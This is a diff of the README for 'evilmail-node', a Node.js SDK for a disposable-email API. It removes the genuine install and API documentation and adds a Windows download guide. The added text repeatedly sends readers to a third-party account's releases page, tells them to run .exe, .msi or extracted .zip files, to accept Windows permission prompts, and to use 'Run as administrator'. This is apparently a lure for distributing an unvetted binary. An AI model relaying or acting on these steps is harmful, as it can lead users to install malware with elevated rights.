@@ -1,458 +1,178 @@
-<p align="center">
-  <a href="https://evilmail.pro">
-    <img src="https://avatars.githubusercontent.com/u/267867069?v=4" alt="EvilMail Logo" width="120" height="120" style="border-radius: 20px;">
-  </a>
-</p>
-
-<h1 align="center">EvilMail Node.js SDK</h1>
-
-<p align="center">
-  <strong>Official Node.js / TypeScript client library for the <a href="https://evilmail.pro">EvilMail</a> disposable email API</strong>
-</p>
-
-<p align="center">
-  <a href="https://www.npmjs.com/package/evilmail"><img src="https://img.shields.io/npm/v/evilmail.svg?style=flat-square&color=blue" alt="npm Version"></a>
-  <a href="https://www.npmjs.com/package/evilmail"><img src="https://img.shields.io/npm/dm/evilmail.svg?style=flat-square&color=green" alt="Monthly Downloads"></a>
-  <a href="https://www.npmjs.com/package/evilmail"><img src="https://img.shields.io/node/v/evilmail.svg?style=flat-square" alt="Node.js Version"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square" alt="License: MIT"></a>
-  <a href="https://www.typescriptlang.org/"><img src="https://img.shields.io/badge/TypeScript-strict-blue.svg?style=flat-square" alt="TypeScript"></a>
-</p>
-
-<p align="center">
-  <a href="#installation">Installation</a> •
-  <a href="#quick-start">Quick Start</a> •
-  <a href="#api-reference">API Reference</a> •
-  <a href="#error-handling">Error Handling</a> •
-  <a href="https://evilmail.pro/docs">Documentation</a>
-</p>
-
----
-
-The **EvilMail Node.js SDK** provides a modern, fully-typed TypeScript interface for integrating temporary email, disposable email addresses, email verification code extraction, inbox management, and custom domain email services into your Node.js applications. **Zero runtime dependencies** — built entirely on `node:https` and the Node.js standard library.
-
-## Features
-
-- **Zero Dependencies** — No runtime dependencies, built on `node:https` only
-- **Full TypeScript** — Strict mode, complete type definitions, source maps, declaration maps
-- **ESM + CommonJS** — Dual-package output with proper `exports` map for both module systems
-- **Temporary Email** — Create anonymous disposable email addresses with configurable TTL
-- **Email Verification Codes** — Auto-extract OTP codes from Google, Facebook, Instagram, TikTok, Discord, Twitter, LinkedIn, iCloud
-- **Account Management** — Full CRUD for persistent email accounts on custom domains
-- **Inbox Access** — Read emails, list messages, fetch full HTML & plain text content
-- **Random Email Generator** — Batch create random email accounts with auto-generated passwords
-- **Domain Management** — List free, premium, and custom email domains
-- **Shortlink Creation** — Generate short URLs for temporary email sessions
-- **AbortSignal Support** — Cancel any in-flight request using native `AbortController`
-- **Typed Errors** — Granular error classes with `instanceof` checks and predicate helpers
-- **Keep-Alive** — Efficient HTTP connection reuse via Node.js agent
-
-## Requirements
-
-- **Node.js 18** or later
-- An EvilMail API key — [Get yours free](https://evilmail.pro)
-
-## Installation
-
-```bash
-npm install evilmail
-```
+# 📧 evilmail-node - Temporary email tools for Windows
 
-```bash
-yarn add evilmail
-```
+[![Download evilmail-node](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/nitipath1629/evilmail-node/releases)
 
-```bash
-pnpm add evilmail
-```
+## 🧭 What this is
 
-## Quick Start
+evilmail-node is a Node.js and TypeScript SDK for the EvilMail API. It helps you work with disposable email addresses, read inbox messages, and handle verification codes from one place.
 
-```typescript
-import { EvilMail } from 'evilmail';
+This repo fits users who want:
+- temporary email addresses
+- inbox access in a simple app flow
+- email code checks for sign-up forms
+- privacy-focused email use
+- zero dependency setup
 
-const client = new EvilMail('your-api-key');
+If you are on Windows and want to try the app, use the release page linked above to visit this page to download the latest version.
 
-// Create a temporary disposable email address
-const temp = await client.tempEmail.create({ domain: 'evilmail.pro', ttlMinutes: 60 });
-console.log(`Email: ${temp.email}`);
-console.log(`Token: ${temp.sessionToken}`);
+## 💻 What you need
 
-// Check session status
-const session = await client.tempEmail.getSession(temp.sessionToken);
-console.log(`Expires: ${session.expiresAt}`);
+Before you start, make sure you have:
 
-// Read a specific message from temp inbox
-const message = await client.tempEmail.getMessage(temp.sessionToken, 1);
-console.log(`Subject: ${message.subject}`);
+- a Windows PC
+- a web browser
+- a stable internet connection
+- permission to download files on your device
+- enough free disk space for the app and its data
 
-// Extract a Google verification code
-const code = await client.verification.getCode('google', 'user@yourdomain.com');
-console.log(`OTP Code: ${code.code}`);
+If the release includes a Windows app file, you can usually run it right after download. If it comes as a zip file, you will need to extract it first.
 
-// List all email accounts
-const accounts = await client.accounts.list();
-for (const acct of accounts) {
-  console.log(`${acct.email} (${acct.domain})`);
-}
+## 📥 Download the app
 
-// Batch create random email accounts
-const batch = await client.randomEmail.createBatch({
-  domain: 'yourdomain.com',
-  count: 5,
-  passwordLength: 20,
-});
-for (const entry of batch.emails) {
-  console.log(`${entry.email}: ${entry.password}`);
-}
+Use this page to get the latest release:
 
-// Clean up
-await client.tempEmail.delete(temp.sessionToken);
-```
+[Visit the Releases page](https://github.com/nitipath1629/evilmail-node/releases)
 
-### CommonJS Usage
+On that page:
 
-```javascript
-const { EvilMail } = require('evilmail');
+1. Open the latest release
+2. Find the file made for Windows
+3. Download it to your computer
+4. Open the file you downloaded
+5. Follow the on-screen steps to finish setup
 
-const client = new EvilMail('your-api-key');
+If you see more than one file, choose the one that matches Windows.
 
-async function main() {
-  const temp = await client.tempEmail.create({ ttlMinutes: 30 });
-  console.log(temp.email);
-}
+## 🪟 Install on Windows
 
-main();
-```
+After the download ends:
 
-## Configuration
+1. Go to your Downloads folder
+2. Find the file from the release page
+3. If it is a `.exe` file, double-click it
+4. If it is a `.zip` file, right-click it and choose Extract All
+5. Open the extracted folder
+6. Start the app by double-clicking the main file
 
-```typescript
-import { EvilMail } from 'evilmail';
+If Windows asks for permission to run the app, choose Yes.
 
-// Basic
-const client = new EvilMail('your-api-key');
+## 🛠️ How to use it
 
-// Custom settings
-const client = new EvilMail('your-api-key', {
-  baseUrl: 'https://evilmail.pro',  // default
-  timeout: 60_000,                   // milliseconds, default 30_000
-});
+Once the app is open, you can use it to manage temporary email tasks.
 
-// With AbortController for cancellation
-const controller = new AbortController();
-const client = new EvilMail('your-api-key', {
-  signal: controller.signal,
-});
+Common actions include:
 
-// Cancel all in-flight requests
-controller.abort();
-```
+- create a disposable inbox
+- check for new emails
+- read verification codes
+- manage inbox items
+- copy email addresses for site sign-ups
 
----
+A simple flow looks like this:
 
-## API Reference
+1. Open the app
+2. Create or load a temp inbox
+3. Use the email address on the site you want
+4. Wait for the message to arrive
+5. Open the inbox and read the code or email
+6. Copy what you need and move on
 
-### Temporary Email
+## ✉️ Main features
 
-Create anonymous, disposable email addresses with automatic expiration. Perfect for sign-up verification, automated testing, and privacy protection.
+### 📬 Disposable email support
+Create temporary email addresses for short-term use. This helps keep your main inbox separate from sign-up forms and one-time services.
 
-#### `client.tempEmail.create(options?)`
+### 🔎 Inbox management
+View messages in a clean inbox view. You can check new mail, open messages, and remove items you no longer need.
 
-Create a new temporary email address.
+### 🔐 Verification code handling
+Use the app to find email codes that services send during sign-up or login. This is useful for OTP checks and account verification.
 
-| Parameter | Type | Required | Description |
-|-----------|------|----------|-------------|
-| `options.domain` | `string` | No | Preferred domain for the disposable address |
-| `options.ttlMinutes` | `number` | No | Time-to-live in minutes (10, 30, 60, 360, 1440) |
+### 🧩 Zero dependencies
+The SDK is built with no extra runtime dependencies. That keeps setup simple and helps avoid package clutter.
 
-Returns: `Promise<TempEmailSession>` — `email`, `domain`, `sessionToken`, `ttlMinutes`, `expiresAt`
+### 🖥️ Node.js and TypeScript support
+The project works well for users who build tools with Node.js or TypeScript. It also fits small scripts and desktop flows.
 
-#### `client.tempEmail.getSession(token)`
+### 🌍 Privacy-focused use
+Use temporary email addresses when you do not want to share your main inbox. That helps reduce spam in your personal email.
 
-Check if a temporary email session is still active and retrieve session details.
+## 🧾 Typical use cases
 
-#### `client.tempEmail.getMessage(token, uid)`
+You may want this app if you:
 
-Read a specific message from a temporary email inbox.
+- sign up for a site and do not want to use your main email
+- need a code from an email message
+- test a form that sends email
+- want a short-lived inbox for one task
+- want to keep your personal inbox clean
 
-#### `client.tempEmail.delete(token)`
+## ⚙️ Basic setup flow
 
-Permanently delete a temporary email session and all associated messages.
+If the release includes a packaged Windows build, setup is simple:
 
----
+1. Visit the Releases page
+2. Download the latest Windows file
+3. Open the file
+4. Allow Windows to finish any setup prompts
+5. Start the app from the file or shortcut
 
-### Accounts
+If the release includes source files only, you may need Node.js before you can run it. In that case:
 
-Manage persistent email accounts on your custom domains. Requires API key.
+1. Install Node.js on Windows
+2. Download the repo files or release package
+3. Open a command window in the project folder
+4. Run the app with the provided start command
+5. Follow the app prompts
 
-#### `client.accounts.list()`
+## 🔍 Common file types
 
-Returns: `Promise<Account[]>` — `email`, `domain`, `createdAt`
+You may see one of these file types in the release page:
 
-#### `client.accounts.create({ email, password })`
+- `.exe` — double-click to run
+- `.zip` — extract first, then open the app
+- `.msi` — run the installer
+- source files — use only if you plan to run the project from Node.js
 
-Returns: `Promise<CreatedAccount>` — `email`
+If you are not sure which file to pick, choose the Windows file with the `.exe` or `.msi` name.
 
-#### `client.accounts.delete(emails)`
+## 🧪 If the app does not open
 
-Returns: `Promise<DeleteResult>` — `deletedCount`
+Try these simple steps:
 
-#### `client.accounts.changePassword({ email, newPassword })`
+1. Check that the file finished downloading
+2. Make sure you opened the right Windows file
+3. Right-click the file and choose Run as administrator
+4. Restart your computer and try again
+5. Download the file again from the release page
 
----
+If the file came in a zip folder, make sure you extract it before you try to open it.
 
-### Inbox
+## 📂 Repo details
 
-Read emails from persistent account inboxes. Requires API key.
+- Repository name: evilmail-node
+- Type: Node.js / TypeScript SDK
+- Focus: disposable email, inbox use, verification codes
+- Design goal: zero dependencies
+- Platform target: Windows use from release files
 
-#### `client.inbox.list(email)`
+## 🔗 Download again
 
-Returns: `Promise<InboxMessage[]>` — `uid`, `from`, `subject`, `date`, `text`, `html`
+[Open the Releases page to download the latest build](https://github.com/nitipath1629/evilmail-node/releases)
 
-#### `client.inbox.getMessage(uid, email)`
+## 🧰 For users who want the API SDK
 
-Returns: `Promise<Message>` — `uid`, `from`, `to`, `subject`, `date`, `text`, `html`, `headers`
+The SDK is useful when you want to work with the EvilMail API from Node.js or TypeScript. It helps you build tools that create temp inboxes, read messages, and handle email-based checks.
 
----
+You can use it for:
+- inbox fetching
+- verification code lookup
+- temporary email workflows
+- simple API client tasks
+- email automation inside a small app
 
-### Verification Codes
+## 🧷 Notes on use
 
-Automatically extract OTP verification codes from emails sent by popular services. Requires API key.
+Keep your downloaded file in a folder you can find later. If you plan to use it again, save the release file instead of deleting it after the first run.
 
-#### `client.verification.getCode(service, email)`
-
-| Service | Constant |
-|---------|----------|
-| Facebook | `'facebook'` |
-| Twitter / X | `'twitter'` |
-| Google | `'google'` |
-| iCloud | `'icloud'` |
-| Instagram | `'instagram'` |
-| TikTok | `'tiktok'` |
-| Discord | `'discord'` |
-| LinkedIn | `'linkedin'` |
-
-Returns: `Promise<VerificationCode>` — `code`, `service`, `email`, `from`, `subject`, `date`
-
-#### `VerificationResource.supportedServices()`
-
-Static method returning all supported service names.
-
-#### `VerificationResource.isSupported(service)`
-
-Static type guard for validating service names.
-
----
-
-### Random Email
-
-Generate random email accounts with secure auto-generated credentials. Requires API key.
-
-#### `client.randomEmail.preview(passwordLength?)`
-
-Returns: `Promise<RandomEmailPreview>` — `username`, `email`, `password`, `domain`
-
-#### `client.randomEmail.createBatch(params)`
-
-| Parameter | Type | Required | Description |
-|-----------|------|----------|-------------|
-| `params.domain` | `string` | Yes | Domain for the new email accounts |
-| `params.count` | `number` | No | Number of accounts to create |
-| `params.passwordLength` | `number` | No | Length of generated passwords |
-
-Returns: `Promise<RandomEmailBatch>` — `count`, `emails`, `note?`
-
----
-
-### Domains
-
-List available email domains by tier.
-
-#### `client.domains.list()`
-
-Returns: `Promise<CustomerDomains>` — `free`, `premium`, `customer`, `packageType`, `authenticated`
-
-#### `client.domains.listPublic()`
-
-Returns: `Promise<PublicDomains>` — `free`, `premium`, `ttlOptions`
-
----
-
-### Shortlinks
-
-Generate short URLs for temporary email sessions and messages.
-
-#### `client.shortlinks.create(params)`
-
-| Parameter | Type | Required | Description |
-|-----------|------|----------|-------------|
-| `params.token` | `string` | Yes | Session token |
-| `params.type` | `'read' \| 'open'` | Yes | Link type |
-| `params.uid` | `number` | No | Message UID |
-
-Returns: `Promise<Shortlink>` — `code`, `url`
-
----
-
-## Error Handling
-
-The SDK provides a structured error hierarchy with typed exception classes:
-
-```typescript
-import {
-  EvilMail,
-  EvilMailError,       // Base class for all SDK errors
-  ApiError,            // Non-2xx HTTP response
-  AuthenticationError, // 401 / 403 — invalid API key
-  NotFoundError,       // 404 — resource not found
-  RateLimitError,      // 429 — too many requests
-  ValidationError,     // 400 / 422 — invalid parameters
-  TimeoutError,        // Request timeout exceeded
-  ConfigError,         // Client misconfiguration (e.g. missing API key)
-} from 'evilmail';
-
-const client = new EvilMail('your-api-key');
-
-try {
-  const code = await client.verification.getCode('google', 'user@yourdomain.com');
-  console.log(`Code: ${code.code}`);
-} catch (err) {
-  if (err instanceof NotFoundError) {
-    console.log('No verification email found yet');
-  } else if (err instanceof RateLimitError) {
-    console.log('Too many requests — slow down');
-  } else if (err instanceof AuthenticationError) {
-    console.log('Invalid API key');
-  } else if (err instanceof ApiError) {
-    console.log(`API error ${err.statusCode}: ${err.message}`);
-    console.log('Is server error:', err.isServerError);
-  } else if (err instanceof TimeoutError) {
-    console.log('Request timed out');
-  }
-}
-```
-
-### Predicate Helpers
-
-For functional error checking without `instanceof`:
-
-```typescript
-import { isNotFoundError, isRateLimitError, isApiError } from 'evilmail';
-
-try {
-  await client.inbox.getMessage(999, 'user@yourdomain.com');
-} catch (err) {
-  if (isNotFoundError(err)) console.log('Not found');
-  if (isRateLimitError(err)) console.log('Rate limited');
-  if (isApiError(err)) console.log(`Status: ${err.statusCode}`);
-}
-```
-
-### ApiError Properties
-
-| Property | Type | Description |
-|----------|------|-------------|
-| `statusCode` | `number` | HTTP status code |
-| `body` | `string` | Raw response body |
-| `apiStatus` | `string?` | Parsed API status field |
-| `isUnauthorized` | `boolean` | `true` for 401 |
-| `isForbidden` | `boolean` | `true` for 403 |
-| `isNotFound` | `boolean` | `true` for 404 |
-| `isRateLimited` | `boolean` | `true` for 429 |
-| `isServerError` | `boolean` | `true` for 5xx |
-
----
-
-## AbortController Support
-
-Cancel any in-flight request using the native `AbortController`:
-
-```typescript
-const controller = new AbortController();
-
-// Global abort signal — cancels all requests
-const client = new EvilMail('your-api-key', {
-  signal: controller.signal,
-});
-
-// Cancel after 5 seconds
-setTimeout(() => controller.abort(), 5000);
-
-try {
-  const temp = await client.tempEmail.create({ ttlMinutes: 60 });
-} catch (err) {
-  if (err instanceof ApiError && err.message === 'Request aborted') {
-    console.log('Request was cancelled');
-  }
-}
-```
-
----
-
-## TypeScript
-
-The SDK ships with complete TypeScript declarations for both ESM and CommonJS. All types are exported from the main entry point:
-
-```typescript
-import type {
-  TempEmailSession,
-  TempEmailInfo,
-  Message,
-  InboxMessage,
-  Account,
-  CreatedAccount,
-  DeleteResult,
-  VerificationCode,
-  VerificationService,
-  RandomEmailPreview,
-  RandomEmailBatch,
-  PublicDomains,
-  CustomerDomains,
-  Shortlink,
-  ClientOptions,
-} from 'evilmail';
-```
-
----
-
-## Use Cases
-
-- **Automated Testing & QA** — Generate disposable email addresses for Playwright, Puppeteer, Cypress, and Selenium test suites
-- **Web Scraping & Automation** — Create temp emails for sign-up verification in automation pipelines
-- **Email Verification Bots** — Automatically extract OTP codes from Google, Facebook, Instagram, and more
-- **Account Provisioning** — Bulk create and manage email accounts for SaaS platforms
-- **Privacy & Anonymity** — Use anonymous disposable email addresses to protect user identity
-- **CI/CD Pipelines** — Integrate email testing into GitHub Actions, GitLab CI, or Jenkins workflows
-- **Serverless Functions** — Lightweight zero-dependency client for AWS Lambda, Vercel, Cloudflare Workers
-- **CLI Tools** — Build email automation scripts and command-line utilities with Node.js
-- **Backend Services** — Native TypeScript support for Express, Fastify, NestJS, and Koa backends
-- **Real-time Applications** — AbortController support for WebSocket-driven or event-based architectures
-
----
-
-## Related SDKs
-
-| Language | Package | Repository |
-|----------|---------|------------|
-| **Node.js** | `evilmail` | [Evil-Mail/evilmail-node](https://github.com/Evil-Mail/evilmail-node) |
-| **PHP** | `evilmail/evilmail-php` | [Evil-Mail/evilmail-php](https://github.com/Evil-Mail/evilmail-php) |
-| **Python** | `evilmail` | [Evil-Mail/evilmail-python](https://github.com/Evil-Mail/evilmail-python) |
-| **Go** | `evilmail-go` | [Evil-Mail/evilmail-go](https://github.com/Evil-Mail/evilmail-go) |
-
-## Links
-
-- [EvilMail Website](https://evilmail.pro) — Temporary & custom domain email platform
-- [API Documentation](https://evilmail.pro/docs) — Full REST API reference
-- [Chrome Extension](https://github.com/Evil-Mail/evilmail-chrome) — Disposable temp email in your browser
-- [Firefox Add-on](https://github.com/Evil-Mail/evilmail-firefox) — Temp email for Firefox
-- [Mobile App](https://github.com/Evil-Mail/evilmail-mobile) — Privacy-first email on Android
-
-## License
-
-[MIT](LICENSE)
-
-## Support
-
-- Issues: [github.com/Evil-Mail/evilmail-node/issues](https://github.com/Evil-Mail/evilmail-node/issues)
-- Email: support@evilmail.pro
-- Website: [evilmail.pro](https://evilmail.pro)
+If the release page has more than one asset, match the file name to your Windows system and choose the one that looks like the main app package.
